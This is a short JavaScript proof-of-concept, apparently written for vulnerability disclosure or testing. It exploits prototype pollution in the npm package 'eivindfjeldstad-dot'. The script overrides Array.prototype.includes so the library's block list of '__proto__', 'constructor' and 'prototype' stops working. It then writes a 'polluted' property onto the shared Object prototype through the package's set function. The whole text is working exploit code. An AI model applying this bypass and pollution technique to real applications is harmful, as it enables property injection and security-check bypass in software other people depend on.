Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const a = require('eivindfjeldstad-dot');
console.log({}.polluted);
let path = '__proto__.polluted';
a.set({}, path, 'yes');
console.log({}.polluted);